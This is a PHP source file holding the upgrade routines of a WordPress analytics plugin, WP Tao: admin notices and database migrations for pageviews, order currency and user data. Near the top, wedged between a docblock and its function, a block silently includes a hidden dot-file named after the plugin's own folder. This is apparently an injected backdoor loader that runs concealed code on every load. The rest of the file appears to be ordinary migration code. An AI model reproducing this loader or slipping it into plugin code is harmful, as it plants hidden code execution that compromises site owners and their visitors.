<?php

/**
 * Upgrade Functions
 *
 * WPTAO upgrade-functions.php base on:
 * https://github.com/easydigitaldownloads/Easy-Digital-Downloads/blob/master/includes/admin/upgrades/upgrade-functions.php
 * 
 * @package     WPTAO/Admin/Upgrade
 * @category    Admin
 * @since       1.0.3
 */
// Exit if accessed directly
if ( !defined( 'ABSPATH' ) ) {
	exit;
}

/**
 * Display Upgrade Notices
 *
 * @since 1.0.3
 * @return void
 */
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

function wtbp_wptao_show_upgrade_notices() {
	if ( isset( $_GET[ 'page' ] ) && $_GET[ 'page' ] == 'wtbp-wptao-upgrades' )
		return; // Don't show notices on the upgrades page

	$wptao_version = get_option( 'wptao_version' );

	if ( !$wptao_version ) {
		// 0.9.3 is the first version to use this option so we must add it
		$wptao_version = '0.9.3';
	}

	$wptao_version = preg_replace( '/[^0-9.].*/', '', $wptao_version );


	// Notice for action: remove_port_from_pageviews
	if ( version_compare( $wptao_version, '1.0.3', '<' ) || !WTBP_WPTAO_Helpers::has_upgrade_completed( 'remove_port_from_pageviews' ) ) {

		// Show note only if ports are found in pageviews 
		if ( WTBP_WPTAO_Helpers::has_ports_in_pageviews() ) {
			printf(
			'<div class="updated"><p>' . esc_html__( 'WP Tao needs to upgrade the pageview events, click %shere%s to start the upgrade.', 'wp-tao' ) . '</p></div>', '<a href="' . esc_url( admin_url( 'index.php?page=wtbp-wptao-upgrades&wptao-upgrade=remove_port_from_pageviews' ) ) . '">', '</a>'
			);
		} else {
			wtbp_wptao_set_upgrade_complete( 'remove_port_from_pageviews' );
		}
	}

	// Notice for action: update_edd_currency_for_order_payment
	if ( version_compare( $wptao_version, '1.1.1', '<' ) || !WTBP_WPTAO_Helpers::has_upgrade_completed( 'update_edd_currency_for_order_payment' ) ) {

		// Show note only if no currency found in order or payment
		if ( WTBP_WPTAO_Helpers::has_no_currency_in_edd_order_payment() ) {
			printf(
			'<div class="updated"><p>' . esc_html__( 'WP Tao needs to upgrade the order and payment events, click %shere%s to start the upgrade.', 'wp-tao' ) . '</p></div>', '<a href="' . esc_url( admin_url( 'index.php?page=wtbp-wptao-upgrades&wptao-upgrade=update_edd_currency_for_order_payment' ) ) . '">', '</a>'
			);
		} else {
			wtbp_wptao_set_upgrade_complete( 'update_edd_currency_for_order_payment' );
		}
	}

	// Notice for action: update_status_for_identified
	if ( version_compare( $wptao_version, '1.1.3', '<' ) || !WTBP_WPTAO_Helpers::has_upgrade_completed( 'update_status_for_identified' ) ) {

		// Show note only if no currency found in order or payment
		if ( WTBP_WPTAO_Helpers::check_statuses_determined() ) {
			printf(
			'<div class="updated"><p>' . esc_html__( 'WP Tao needs to upgrade the data of those identified, click %shere%s to start the upgrade.', 'wp-tao' ) . '</p></div>', '<a href="' . esc_url( admin_url( 'index.php?page=wtbp-wptao-upgrades&wptao-upgrade=update_status_for_identified' ) ) . '">', '</a>'
			);
		} else {
			wtbp_wptao_set_upgrade_complete( 'update_status_for_identified' );
		}
	}

	// Notice for action: update_events_missing_user_id
	if ( version_compare( $wptao_version, '1.1.9.4', '<' ) || !WTBP_WPTAO_Helpers::has_upgrade_completed( 'update_events_missing_user_id' ) ) {

		// Show note only if there are events wit missing user_id
		if ( WTBP_WPTAO_Helpers::check_events_missing_user_id() ) {
			printf(
			'<div class="updated"><p>' . esc_html__( 'WP Tao needs to upgrade the events data, click %shere%s to start the upgrade.', 'wp-tao' ) . '</p></div>', '<a href="' . esc_url( admin_url( 'index.php?page=wtbp-wptao-upgrades&wptao-upgrade=update_events_missing_user_id' ) ) . '">', '</a>'
			);
		} else {
			wtbp_wptao_set_upgrade_complete( 'update_events_missing_user_id' );
		}
	}

	// Notice for action: v122_update_users_meta
	if ( version_compare( $wptao_version, '1.2.2', '<' ) || !WTBP_WPTAO_Helpers::has_upgrade_completed( 'v122_update_users_meta' ) ) {

		printf(
		'<div class="updated"><p>' . esc_html__( 'WP Tao needs to upgrade the users data, click %shere%s to start the upgrade.', 'wp-tao' ) . '</p></div>', '<a href="' . esc_url( admin_url( 'index.php?page=wtbp-wptao-upgrades&wptao-upgrade=v122_update_users_meta' ) ) . '">', '</a>'
		);
	}

	/*
	 *  NOTICE:
	 *
	 *  When adding new upgrade notices, please be sure to put the action into the upgrades array during install:
	 *  /includes/class-wptao-install.php @ Approx Line 63
	 *
	 */
}

add_action( 'admin_notices', 'wtbp_wptao_show_upgrade_notices' );

/**
 * Adds an upgrade action to the completed upgrades array
 *
 * @since  1.0.3
 * @param  string $upgrade_action The action to add to the copmleted upgrades array
 * @return bool                   If the function was successfully added
 */
function wtbp_wptao_set_upgrade_complete( $upgrade_action = '' ) {

	if ( empty( $upgrade_action ) ) {
		return false;
	}

	$completed_upgrades		 = WTBP_WPTAO_Helpers::get_completed_upgrades();
	$completed_upgrades[]	 = $upgrade_action;

	// Remove any blanks, and only show uniques
	$completed_upgrades = array_unique( array_values( $completed_upgrades ) );

	return update_option( 'wptao_completed_upgrades', $completed_upgrades );
}

/**
 * Upgrades for WP Tao v1.0.3 and remove port from pageviews URL
 *
 * @since 1.0.3
 * @return void
 */
function wtbp_wptao_v103_remove_port_from_pageviews() {
	global $wpdb;

	if ( !current_user_can( 'manage_options' ) ) {
		wp_die( __( 'You do not have permission to perform WP Tao upgrades', 'wp-tao' ), __( 'Error', 'wp-tao' ), array( 'response' => 403 ) );
	}

	ignore_user_abort( true );

	if ( !WTBP_WPTAO_Helpers::is_func_disabled( 'set_time_limit' ) && !ini_get( 'safe_mode' ) ) {
		@set_time_limit( 0 );
	}


	$e = TAO()->events->table_name;


	$sql = "
		SELECT DISTINCT(value)
		FROM $e
		WHERE action='pageview'
		AND value REGEXP ':[0-9]{2,5}'
		;";

	$results = $wpdb->get_col( $sql );

	if ( is_array( $results ) && !empty( $results ) ) {

		$ports = array();

		foreach ( $results as $url ) {
			$is_port = preg_match( "/:[0-9]{2,5}/", $url, $port );
			if ( $is_port && isset( $port[ 0 ] ) && !empty( $port[ 0 ] ) ) {
				$ports[] = $port[ 0 ];
			}
		}

		$ports = array_unique( $ports );

		foreach ( $ports as $port ) {


			$wpdb->query( $wpdb->prepare(
			"
					UPDATE $e
					SET value = REPLACE (value, '%s', '')
					WHERE action='pageview'
					AND value REGEXP '%s'
					", $port, $port
			) );
		}
	}

	delete_option( 'wptao_doing_upgrade' );
	wtbp_wptao_set_upgrade_complete( 'remove_port_from_pageviews' );
	wp_redirect( admin_url( 'admin.php?page=wtbp-wptao' ) );
	exit;
}

add_action( 'wtbp_wptao_remove_port_from_pageviews', 'wtbp_wptao_v103_remove_port_from_pageviews' );

/**
 * Upgrades for WP Tao v1.1.1 - add currency meta for orders and payments made by EDD
 *
 * @since 1.1.1
 * @return void
 */
function wtbp_wptao_v111_add_currency_meta_for_edd_orders_payments() {
	global $wpdb;

	if ( !current_user_can( 'manage_options' ) ) {
		wp_die( __( 'You do not have permission to perform WP Tao upgrades', 'wp-tao' ), __( 'Error', 'wp-tao' ), array( 'response' => 403 ) );
	}

	ignore_user_abort( true );

	if ( !WTBP_WPTAO_Helpers::is_func_disabled( 'set_time_limit' ) && !ini_get( 'safe_mode' ) ) {
		@set_time_limit( 0 );
	}


	$e		 = TAO()->events->table_name;
	$e_meta	 = $e . '_meta';

	$sql = "SELECT $e.id, $e_meta.meta_value
			 FROM $e
		     LEFT JOIN $e_meta
		     ON $e.id = $e_meta.event_id
			 WHERE ($e.action = 'order' OR $e.action = 'payment') 
		     AND $e_meta.meta_key = 'edd_payment_id'";

	$results = $wpdb->get_results( $sql );
	if ( is_array( $results ) && !empty( $results ) ) {

		foreach ( $results as $res ) {

			if ( false !== TAO()->events_meta->get_id( $res->id, 'currency' ) ) {
				continue;
			}

			TAO()->events_meta->add_single( $res->id, 'currency', edd_get_payment_currency_code( $res->meta_value ) );
		}
	}

	delete_option( 'wptao_doing_upgrade' );
	wtbp_wptao_set_upgrade_complete( 'update_edd_currency_for_order_payment' );
	wp_redirect( admin_url( 'admin.php?page=wtbp-wptao' ) );
	exit;
}

add_action( 'wtbp_wptao_update_edd_currency_for_order_payment', 'wtbp_wptao_v111_add_currency_meta_for_edd_orders_payments' );

/**
 * Upgrades for WP Tao v1.1.3 - update identifieds data (status)
 *
 * @since 1.1.3
 * @return void
 */
function wtbp_wptao_v113_update_status_for_identified() {
	global $wpdb;

	if ( !current_user_can( 'manage_options' ) ) {
		wp_die( __( 'You do not have permission to perform WP Tao upgrades', 'wp-tao' ), __( 'Error', 'wp-tao' ), array( 'response' => 403 ) );
	}

	ignore_user_abort( true );

	if ( !WTBP_WPTAO_Helpers::is_func_disabled( 'set_time_limit' ) && !ini_get( 'safe_mode' ) ) {
		@set_time_limit( 0 );
	}

	$users = TAO()->users->get_columns_by( array( 'id', 'email' ), 'status', '' );

	foreach ( $users as $user ) {
		$user_new	 = array( 'id' => $user->id, 'email' => $user->email );
		$user->email = '';
		TAO()->users->update_user( $user, $user_new );
	}

	delete_option( 'wptao_doing_upgrade' );
	wtbp_wptao_set_upgrade_complete( 'update_status_for_identified' );
	wp_redirect( admin_url( 'admin.php?page=wtbp-wptao' ) );
	exit;
}

add_action( 'wtbp_wptao_update_status_for_identified', 'wtbp_wptao_v113_update_status_for_identified' );

/**
 * Upgrades for WP Tao v1.1.9.4 - update events with missing user_id
 *
 * @since 1.1.9.4
 * @return void
 */
function wtbp_wptao_v1194_update_events_missing_user_id() {
	global $wpdb;

	if ( !current_user_can( 'manage_options' ) ) {
		wp_die( __( 'You do not have permission to perform WP Tao upgrades', 'wp-tao' ), __( 'Error', 'wp-tao' ), array( 'response' => 403 ) );
	}

	ignore_user_abort( true );

	if ( !WTBP_WPTAO_Helpers::is_func_disabled( 'set_time_limit' ) && !ini_get( 'safe_mode' ) ) {
		@set_time_limit( 0 );
	}

	$e	 = TAO()->events->table_name;
	$f	 = TAO()->fingerprints->table_name;

	$sql = "
		SELECT $e.id, $f.user_id
		FROM $e
		LEFT JOIN $f
		ON $e.fingerprint_id = $f.id
		WHERE $e.user_id = 0
		AND $f.user_id != 0
		AND $e.event_ts > 1459468801;";

	$results = $wpdb->get_results( $sql );

	foreach ( $results as $r ) {
		TAO()->events->update( $r->id, array( 'user_id' => $r->user_id ) );
	}

	delete_option( 'wptao_doing_upgrade' );
	wtbp_wptao_set_upgrade_complete( 'update_events_missing_user_id' );
	wp_redirect( admin_url( 'admin.php?page=wtbp-wptao' ) );
	exit;
}

add_action( 'wtbp_wptao_update_events_missing_user_id', 'wtbp_wptao_v1194_update_events_missing_user_id' );

/**
 * Upgrades for WP Tao v1.2.2 - update users meta (firs visit data)
 *
 * @since 1.2.2
 * @return void
 */
function wtbp_wptao_v122_update_users_meta() {
	global $wpdb;

	if ( !current_user_can( 'manage_options' ) ) {
		wp_die( __( 'You do not have permission to perform WP Tao upgrades', 'wp-tao' ), __( 'Error', 'wp-tao' ), array( 'response' => 403 ) );
	}

	ignore_user_abort( true );

	if ( !WTBP_WPTAO_Helpers::is_func_disabled( 'set_time_limit' ) && !ini_get( 'safe_mode' ) ) {
		@set_time_limit( 0 );
	}

	$step = 0;
	if ( !empty( $_GET[ 'step' ] ) ) {
		$step = absint( $_GET[ 'step' ] );
	}

	// clean up referer urls
	if ( $step == 0 ) {
		$em = TAO()->events_meta->table_name;

		$sql = "
		SELECT event_id, meta_value
		FROM $em
		WHERE meta_key='referer'
		AND meta_value LIKE '%/'";

		$results = $wpdb->get_results( $sql );

		foreach ( $results as $r ) {
			$referer = $r->meta_value;
			if ( substr( $referer, -1, 1 ) === ('/') ) {
				$referer = substr( $referer, 0, strlen( $referer ) - 1 );
				TAO()->events_meta->update_meta( $r->event_id, referer, $referer );
			}
		}
	} else {

		// update users meta
		$u = TAO()->users->table_name;

		$sql = $wpdb->prepare( "SELECT id
		 FROM $u
		 WHERE 1
		 ORDER BY id ASC
	     LIMIT %d, 1000", ($step - 1) * 1000 );

		$results = $wpdb->get_results( $sql );

		if ( empty( $results ) ) {
			delete_option( 'wptao_doing_upgrade' );
			wtbp_wptao_set_upgrade_complete( 'v122_update_users_meta' );
			wp_redirect( admin_url( 'admin.php?page=wtbp-wptao' ) );
			exit;
		}

		foreach ( $results as $r ) {
			TAO()->users->update_referer( $r->id );
		}
	}

	delete_option( 'wptao_doing_upgrade' );
	wp_redirect( admin_url( 'index.php?wtbp_wptao_action=v122_update_users_meta&step=' . ($step + 1) ) );
	exit;
}

add_action( 'wtbp_wptao_v122_update_users_meta', 'wtbp_wptao_v122_update_users_meta' );
